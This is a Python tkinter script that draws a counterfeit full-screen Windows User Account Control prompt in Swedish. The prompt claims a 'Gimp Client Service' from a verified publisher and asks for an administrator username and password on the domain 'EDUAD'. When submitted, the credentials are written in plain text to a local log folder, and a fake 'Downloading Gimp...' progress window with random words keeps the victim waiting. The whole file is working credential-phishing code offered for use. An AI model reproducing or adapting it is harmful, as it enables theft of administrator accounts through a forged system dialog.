from tkinter import *
from tkinter import ttk
from PIL import Image, ImageTk
import tkinter as tk
import time
import random
import winsound
import os
from datetime import datetime
from pystray import MenuItem as item
import pystray

# Play the alert sound
winsound.PlaySound("SystemHand", winsound.SND_ALIAS)

# Create a Tkinter window
root = Tk()
root.attributes("-fullscreen", True)  # Set window to full screen

# Load image and create a background canvas to display it
image_bg = Image.open("background.jpg")
width, height = root.winfo_screenwidth(), root.winfo_screenheight()
image_bg = image_bg.resize((width, height))
photo_bg = ImageTk.PhotoImage(image_bg)
canvas_bg = Canvas(root, width=width, height=height, borderwidth=0, highlightthickness=0)
canvas_bg.create_image(0, 0, image=photo_bg, anchor=NW)
canvas_bg.pack(fill=BOTH, expand=YES)

# Add darker blue square
blue_squar = Canvas(root, width=462, height=502, bg='#0678F7', highlightthickness=0)
blue_squar.place(relx=0.5, rely=0.55, anchor=CENTER)

def longer_blue_squar():
    blue_squares = Canvas(root, width=462, height=42, bg='#55b0dd', highlightthickness=0)
    blue_squares.place(relx=0.5, rely=0.901, anchor=CENTER)

# Add a gray square at the center of the image
squar = Canvas(root, width=460, height=500, bg='#282828', highlightthickness=0)
squar.place(relx=0.5, rely=0.55, anchor=CENTER)

def longer_squar():
    squares = Canvas(root, width=460, height=40, bg='#282828', highlightthickness=0)
    squares.place(relx=0.5, rely=0.9, anchor=CENTER)

# Add blue top bar
bar = Canvas(squar, width=460, height=95, bg='#83d0f5', highlightthickness=0)
bar.place(relx=0.5, rely=0, anchor=N)

# Add the "User Account Control" label
label = Label(root, text="User Account Control", font=("Segoe UI", 9), fg="black", bg='#83d0f5')
label.place(x=475, y=175)

# Add the "Tillåter du att den här appen får göra" label
label = Label(root, text="Tillåter du att den här appen får göra", font=("Segoe UI", 14), fg="black", bg='#83d0f5')
label.place(x=475, y=200)

# Add the "ändringar på enheten?" label
label = Label(root, text="ändringar på enheten?", font=("Segoe UI", 14), fg="black", bg='#83d0f5')
label.place(x=475, y=228)

# Load image and create a label to display it
image = Image.open("app logo.png")
image = image.resize((50, 50))
photo = ImageTk.PhotoImage(image)
label = Label(root, image=photo, borderwidth=0, highlightthickness=0)
label.place(x=475, y=285)

# Add the "Photoshop Client Service" label
label = Label(root, text="Gimp Client Service", font=("system fallback", 14), fg='#E4e4e4', bg='#282828')
label.place(x=530, y=295)

# Add the "Verifierad utgivare: Adobe Corp." label
label = Label(root, text="Verifierad utgivare: University of California", font=("system fallback", 11), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=350)

# Add the "Filens ursprung: Hårddisk på den här datorn" label
label = Label(root, text="Filens ursprung: Hårddisk på den här datorn", font=("system fallback", 11), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=372)

# Create a label for the "Visa mer information" text
access_account_label = Label(root, text="Visa mer information", font=("Segoe UI", 9), bg="#282828", fg="#0078D7")
access_account_label.place(x=475, y=415)

# Change font color property on hover
def on_enter(e):
    access_account_label.config(fg="#8E8E8E", font=("Segoe UI", 9), cursor="hand2")

def on_leave(e):
    access_account_label.config(fg="#0078D7", font=("Segoe UI", 9), cursor="arrow")

access_account_label.bind("<Enter>", on_enter)
access_account_label.bind("<Leave>", on_leave)

# Add the "Ange ett administratöranvändarnamn
label = Label(root, text="Ange ett administratöranvändarnamn och -lösenord för att", font=("system fallback", 11), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=450)

# Add the "fortsätta." label
label = Label(root, text="fortsätta.", font=("system fallback", 11), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=470)

def focus_on_username_entry(event):
    username_entry.focus()

def focus_on_password_entry(event):
    password_entry.focus()

def on_hover_enter(event):
    if root.focus_get() != username_entry:
        användarnamn_label.configure(bg="#101010")
        username_entry.configure(bg="#101010", highlightbackground="#B3b3b3")

def on_hover_leave(event):
    if root.focus_get() != username_entry:
        användarnamn_label.configure(bg="#181818")
        username_entry.configure(bg="#181818", highlightbackground="#646464")

# Add the "användarnamn" label
användarnamn_label = Label(root, text="användarnamn", font=("system fallback", 11), fg="#646464", bg='#181818', cursor="xterm")
användarnamn_label.place(x=478, y=503)
användarnamn_label.bind("<Button-1>", focus_on_username_entry)
användarnamn_label.config(takefocus=True)

# Bind the enter and leave event to the hover event
användarnamn_label.bind("<Enter>", on_hover_enter)
användarnamn_label.bind("<Leave>", on_hover_leave)

def on_hover_enter(event):
    if root.focus_get() != password_entry:
        lösenord_label.configure(bg="#101010")
        password_entry.configure(bg="#101010", highlightbackground="#B3b3b3")

def on_hover_leave(event):
    if root.focus_get() != password_entry:
        lösenord_label.configure(bg="#181818")
        password_entry.configure(bg="#181818", highlightbackground="#646464")

# Add the "lösenord" label
lösenord_label = Label(root, text="lösenord", font=("system fallback", 11), fg="#646464", bg='#181818', cursor="xterm")
lösenord_label.place(x=478, y=543)
lösenord_label.bind("<Button-1>", focus_on_password_entry)
lösenord_label.config(takefocus=True)

# Bind the enter and leave event to the hover event
lösenord_label.bind("<Enter>", on_hover_enter)
lösenord_label.bind("<Leave>", on_hover_leave)

def on_focus_out(event):
    username_entry.configure(fg="white")
    username_entry.config(bg="#181818", highlightthickness=1, highlightcolor="#646464", highlightbackground="#646464")
    användarnamn_label.config(bg="#181818", fg="#646464")
    x_icon.place(x=5000, y=5000)

def on_focus_in(event):
    username_entry.configure(fg="black")
    username_entry.config(bg="#fcfdff", highlightthickness=1, highlightcolor="#1da8e9", highlightbackground="#1da8e9")
    användarnamn_label.config(bg="#fcfdff", fg="#CECECE")
    if len(username_entry.get()) > 0:
        x_icon.place(x=751, y=501)

def on_key_press(event):
    # Only show the image if the password field has text
    if len(username_entry.get()) > 0:
        användarnamn_label.place(x=5000, y=5000)
    else:
        användarnamn_label.place(x=478, y=503)

    # Show x_icon if username field has text and focus is on the username field
    if username_entry == root.focus_get() and len(username_entry.get()) > 0:
        x_icon.place(x=751, y=501)
    else:
        x_icon.place(x=5000, y=5000)

    # Switch focus to password field if Enter key is pressed while in username field
    if event.keysym == "Return" and event.widget == username_entry:
        password_entry.focus()
        on_press(event)

def on_click(event):
    # Set focus to password entry field if clicked on lösenord label
    if event.widget == lösenord_label:
        password_entry.focus()
        x_icon.place(x=5000, y=5000)
    
    # Set focus to username entry field if clicked on användarnamn label
    elif event.widget == användarnamn_label:
        username_entry.focus()
        x_icon.place(x=5000, y=5000)
    
    # Remove focus from entry fields if clicked outside them
    elif event.widget not in (password_entry, username_entry, x_icon):
        root.focus()
        x_icon.place(x=5000, y=5000)

    # Set focus to the username entry field if x icon is clicked
    elif event.widget == x_icon:
        username_entry.focus()
        x_icon.place(x=5000, y=5000)

def on_hover_enter(event):
    if root.focus_get() != username_entry:
        användarnamn_label.configure(bg="#101010")
        username_entry.configure(bg="#101010", highlightbackground="#B3b3b3")

def on_hover_leave(event):
    if root.focus_get() != username_entry:
        användarnamn_label.configure(bg="#181818")
        username_entry.configure(bg="#181818", highlightbackground="#646464")

username_entry = Entry(root, width=30, font=("Segoe UI", 14), bg="#181818", fg="black", bd=0, highlightthickness=1, highlightcolor="#646464", highlightbackground="#646464")
username_entry.place(x=475, y=500)

# Bind the enter and leave event to the hover event
username_entry.bind("<Enter>", on_hover_enter)
username_entry.bind("<Leave>", on_hover_leave)

# Bind the focus events to the entry field
username_entry.bind("<FocusIn>", on_focus_in)
username_entry.bind("<FocusOut>", on_focus_out)

# Bind the key event to the root window
root.bind_all("<Key>", on_key_press)

# Bind click event to root window
root.bind("<Button-1>", on_click)

def on_x_click(event):
    x_icon.config(bg="#1da8e9")
    x_icon.itemconfig(line1, fill="white")
    x_icon.itemconfig(line2, fill="white")
    return "break"

def on_x_enter(event):
    x_icon.itemconfig(line1, fill="#1da8e9")
    x_icon.itemconfig(line2, fill="#1da8e9")

def on_x_leave(event):
    x_icon.itemconfig(line1, fill="black")
    x_icon.itemconfig(line2, fill="black")
    x_icon.config(bg="#fcfdff")

def on_x_release(event):
    username_entry.delete(0, END)
    användarnamn_label.place(x=478, y=503)
    x_icon.itemconfig(line1, fill="#1da8e9")
    x_icon.itemconfig(line2, fill="#1da8e9")
    x_icon.config(bg="#fcfdff")
    x_icon.place(x=5000, y=5000)

# Create the X icon
x_icon = Canvas(root, width=27, height=27, bg='#fcfdff', highlightthickness=0)
x_icon.create_line(9, 9, 20, 20, fill="black", width=1)
x_icon.create_line(9, 20, 20, 9, fill="black", width=1)
x_icon.place(x=5000, y=5000)

# Bind events to the X icon
x_icon.bind("<Enter>", on_x_enter)
x_icon.bind("<Leave>", on_x_leave)
x_icon.bind("<Button-1>", on_x_click)
x_icon.bind("<ButtonRelease-1>", on_x_release)

def on_focus_out(event):
    password_entry.config(bg="#181818", highlightthickness=1, highlightcolor="#646464", highlightbackground="#646464")
    lbl_eye.place(x=5000, y=5000)
    lösenord_label.config(bg="#181818", fg="#646464")
    password_entry.configure(fg="white")

def on_focus_in(event):
    password_entry.configure(fg="black")
    x_icon.place(x=5000, y=5000)
    password_entry.config(bg="#fcfdff", highlightthickness=1, highlightcolor="#1da8e9", highlightbackground="#1da8e9")
    on_key_press(None)  # Call on_key_press function to show/hide the image
    lösenord_label.config(bg="#fcfdff", fg="#CECECE")
    
def on_key_press(event):
    # Show lösenord_label if password field has text in it
    if len(password_entry.get()) > 0:
        lösenord_label.place(x=5000, y=5000)
    else:
        lösenord_label.place(x=478, y=543)

    # Show lbl_eye if password field has text and focus is on the password field
    if password_entry == root.focus_get() and len(password_entry.get()) > 0:
        lbl_eye.place(x=751, y=541)
    else:
        lbl_eye.place(x=5000, y=5000)

def on_click(event):
    # Set focus to username entry field if clicked on användarnamn label
    if event.widget == användarnamn_label:
        username_entry.focus()
        x_icon.place(x=5000, y=5000)
    
    # Set focus to password entry field if clicked on lösenord label
    elif event.widget == lösenord_label:
        password_entry.focus()
        x_icon.place(x=5000, y=5000)
    
    # Remove focus from entry fields if clicked outside them
    elif event.widget not in (username_entry, password_entry, lbl_eye):
        root.focus()
        x_icon.place(x=5000, y=5000)

    # Set focus to the password entry field if eye icon is clicked
    elif event.widget == lbl_eye:
        password_entry.focus()
        x_icon.place(x=5000, y=5000)

def on_hover_enter(event):
    if root.focus_get() != password_entry:
        lösenord_label.configure(bg="#101010")
        password_entry.configure(bg="#101010", highlightbackground="#B3b3b3")

def on_hover_leave(event):
    if root.focus_get() != password_entry:
        lösenord_label.configure(bg="#181818")
        password_entry.configure(bg="#181818", highlightbackground="#646464")

def on_return(event):
    on_press(None)

# Create an entry field for the password
password_entry = Entry(root, width=30, font=("Segoe UI", 14), bg="#181818", fg="black", show="●", bd=0, highlightthickness=1, highlightcolor="#646464", highlightbackground="#646464")
password_entry.place(x=475, y=540)

# Bind the return key to the password entry field
password_entry.bind("<Return>", on_return)

# Bind the enter and leave event to the hover event
password_entry.bind("<Enter>", on_hover_enter)
password_entry.bind("<Leave>", on_hover_leave)

# Bind the focus events to the entry field
password_entry.bind("<FocusIn>", on_focus_in)
password_entry.bind("<FocusOut>", on_focus_out)

# Bind the key event to the root window
root.bind("<Key>", on_key_press)

# Bind click event to root window
root.bind("<Button-1>", on_click)

# Load the image
img_eye = Image.open("eye.png").resize((13, 13), resample=Image.LANCZOS)
img_eye_tk = ImageTk.PhotoImage(img_eye)
img_blue_eye = Image.open("blueeye.png").resize((13, 13), resample=Image.LANCZOS)
img_blue_eye_tk = ImageTk.PhotoImage(img_blue_eye)
img_eye_blue = Image.open("eyeblue.png").resize((13, 13), resample=Image.LANCZOS)
img_eye_blue_tk = ImageTk.PhotoImage(img_eye_blue)

# Create a Label with the initial image
lbl_eye = tk.Label(root, image=img_eye_tk, highlightthickness=7, borderwidth=0, highlightbackground="#fcfdff")
lbl_eye.place(x=755, y=545)

# Define the hover and click actions
is_pressed = False
def on_hover(event):
    global is_pressed
    if is_pressed:
        lbl_eye.config(image=img_eye_blue_tk, highlightbackground="#0078d7")
    else:
        lbl_eye.config(image=img_blue_eye_tk, highlightbackground="#fcfdff")

def on_click(event):
    global is_pressed
    is_pressed = True
    lbl_eye.config(image=img_eye_blue_tk, highlightbackground="#0078d7")
    password_entry.configure(show="")

def on_release(event):
    global is_pressed
    is_pressed = False
    lbl_eye.config(image=img_blue_eye_tk, highlightbackground="#fcfdff")
    password_entry.configure(show="●")

# Bind the actions to the Label
lbl_eye.bind("<Enter>", on_hover)
lbl_eye.bind("<Leave>", lambda event: lbl_eye.config(image=img_eye_tk, highlightbackground="#fcfdff"))
lbl_eye.bind("<Button-1>", on_click)
lbl_eye.bind("<ButtonRelease-1>", on_release)

lbl_eye.place(x=5000, y=5000)

# Add the "Domän: EDUAD" label
label = Label(root, text="Domän: EDUAD", font=("system fallback", 10), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=580)

def on_press(event):
    time.sleep(0.5)
    root.destroy()

def on_enter(event):
    nej_button_frame.config(highlightbackground="#909090")

def on_leave(event):
    nej_button_frame.config(highlightbackground="#4c4c4c")

# Make a button that says "Nej" on it
nej_button_frame = tk.Frame(root, highlightbackground="#4c4c4c", highlightthickness=3, bd=0)
nej_button = Button(nej_button_frame, text="Nej", width=28, height=1, pady=5, foreground="white", bg="#4c4c4c", bd=0, activebackground="#4c4c4c", highlightthickness=0)
nej_button.pack(fill="both", expand=True)
nej_button_frame.place(x=690, y=620)

nej_button.bind("<Enter>", on_enter)
nej_button.bind("<Leave>", on_leave)
nej_button.bind("<Button-1>", on_press)

log_file = None

def on_press(event):
    if len(username_entry.get()) == 0:
        show_label()
        longer_blue_squar()
        longer_squar()
        label.lift()
        ja_button_frame.place(x=475, y=655)
        nej_button_frame.place(x=690, y=655)
        ja_button_frame.lift()
        nej_button_frame.lift()
        label.place(x=475, y=610)
    else:
        password = password_entry.get()
        username = username_entry.get()
        if len(password) == 0:
            show_label()
            longer_blue_squar()
            longer_squar()
            label.lift()
            ja_button_frame.place(x=475, y=655)
            nej_button_frame.place(x=690, y=655)
            ja_button_frame.lift()
            nej_button_frame.lift()
            label.place(x=475, y=610)
        else:
            time.sleep(0.5)
            root.destroy()
            # Log the username and password
            log(f"Username: {username}")
            log(f"Password: {password}")
            winsound.PlaySound("SystemHand", winsound.SND_ALIAS)
            create_new_window()

def log(message):
    global log_file

    if log_file is None:
        # Get the current time in a formatted string
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

        # Create the log directory if it doesn't exist
        log_dir = "username & password"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

        # Create a new log file with a unique name
        log_file = f"{log_dir}/log_{timestamp}.txt"

    with open(log_file, "a") as f:
        f.write(message + "\n")
            
def on_enter(event):
    ja_button_frame.config(highlightbackground="#909090")

def on_leave(event):
    ja_button_frame.config(highlightbackground="#4c4c4c")

# Make a button that says "Ja" on it
ja_button_frame = tk.Frame(root, highlightbackground="#4c4c4c", highlightthickness=3, bd=0)
ja_button = Button(ja_button_frame, text="Ja", width=28, height=1, pady=5, foreground="white", bg="#4c4c4c", bd=0, activebackground="#4c4c4c", highlightthickness=0)
ja_button.pack(fill="both", expand=True)
ja_button_frame.place(x=475, y=620)

ja_button.bind("<Enter>", on_enter)
ja_button.bind("<Leave>", on_leave)

ja_button.bind("<Button-1>", on_press)

# Change color property on hover
def on_enter(e):
    square.config(bg="#De1b1b")
    square.itemconfig(line1, fill="white")
    square.itemconfig(line2, fill="white")

def on_click(e):
    root.destroy()

def on_leave(e):
    square.config(bg="#83d0f5")
    square.itemconfig(line1, fill="black")
    square.itemconfig(line2, fill="black")

# Create the square
square = Canvas(root, width=40, height=30, bg='#83d0f5', highlightthickness=0)
square.place(x=873, y=172)

# Get the center coordinates of the square
center_x = 20
center_y = 15

# Draw "X" shape using two lines, starting and ending at the center
line1 = square.create_line(center_x - 5, center_y - 5, center_x + 5, center_y + 5, fill="black", width=1)
line2 = square.create_line(center_x - 5, center_y + 5, center_x + 5, center_y - 5, fill="black", width=1)

square.bind("<Enter>", on_enter)
square.bind("<Leave>", on_leave)

square.bind("<Button-1>", on_click)

def show_label():
    label.place(x=475, y=670)

def hide_label():
    label.place_forget()

# Add the "Ange ett andvändarnamn och ett lösenord" label
label = Label(root, text="Ange ett andvändarnamn och ett lösenord", font=("system fallback", 11), fg="#Fff900", bg='#282828')
label.place(x=475, y=500)
hide_label()

# Define a function to update the label style on hover
def on_hover(event):
    SWE.config(width=4, height=2, bg="#797979")

def on_leave(event):
    SWE.config(width=4, height=2, bg="#444444")

# Add the "SWE" label
SWE = Label(root, text="SWE", font=("system fallback", 12, "bold"), fg="white", bg='#444444', width=4, height=2, pady=2)
SWE.place(x=1275, y=675)

# Bind the function to the label events
SWE.bind("<Enter>", on_hover)
SWE.bind("<Leave>", on_leave)

lösenord_label.lift()
användarnamn_label.lift()
x_icon.lift(root)
username_entry.focus()

def event(e):
    root.destroy()

try:
    root.bind('<Win_L>',event)
except TclError:
    root.bind('<Super_L>',event)
    
def create_new_window():
    # create a new window
    new_window = tk.Tk()
    new_window.title("Gimp downloader_64")
    new_window.geometry("365x300")

    # make the new window non-resizable
    new_window.resizable(False, False)

    # set the background color of the window to white
    new_window.configure(bg="#ffffff")
    
    # set the windows icon
    new_window.iconbitmap('app logo ico.ico')

    # Load image and create a label to display it
    image = Image.open("app logo long.png")
    image = image.resize((170, 80))
    photo = ImageTk.PhotoImage(image)
    label = Label(new_window, image=photo, borderwidth=0, highlightthickness=0)
    label.place(x=475, y=285)

    # create the label widget to display the real-sounding words
    word_label = tk.Label(new_window, text="", font=("Adobe Clean", 12), bg="#ffffff")
    word_label.pack(pady=10)

    # create another label widget to display some additional text
    additional_label = tk.Label(new_window, text="Downloading Gimp...", font=("Arial Rounded MT Bold", 12), bg="#ffffff")
    additional_label.pack(pady=10)

    # create the label widget to display the image
    image_label = tk.Label(new_window, image=photo, borderwidth=0, highlightthickness=0)
    image_label.pack(pady=20)

    # create the progress bar widget
    style = ttk.Style()
    style.theme_use("default")
    style.configure("red.Horizontal.TProgressbar", foreground='#ff0000', background='#d7d7d7')
    progress_bar = ttk.Progressbar(new_window, style="red.Horizontal.TProgressbar", orient="horizontal", length=200, mode="determinate", maximum=100, value=0)
    progress_bar.pack(pady=20)

    # generate random loading times and real-sounding words
    loading_times = []
    total_loading_time = 0
    with open("realsoundingwords.txt", "r") as file:
        words = file.read().splitlines()
    while total_loading_time < 180:
        loading_time = random.randint(2, 30)
        if total_loading_time + loading_time > 180:
            loading_time = 180 - total_loading_time
        loading_times.append((loading_time, random.choice(words)))
        total_loading_time += loading_time

    # start the progress bar animation
    def update_progress():
        if loading_times:
            loading_time, word = loading_times.pop(0)
            progress_bar["maximum"] = loading_time
            progress_bar["value"] = 0
            word_label.config(text=word, bg="#ffffff")

            def increment_progress():
                value = progress_bar["value"]
                if value == loading_time:
                    new_word = random.choice(words)
                    loading_times.append((random.randint(2, 30), new_word))
                    word_label.config(text=new_word)
                    update_progress()
                else:
                    progress_bar["value"] = value + 1
                    new_window.after(500, increment_progress)

            increment_progress()

    # set up the event handler for closing the window
    def on_close():
        new_window.destroy()

    new_window.protocol("WM_DELETE_WINDOW", on_close)

    update_progress()

    # start the main event loop for the new window
    new_window.mainloop()
    
# Run the Tkinter event loop
root.mainloop()
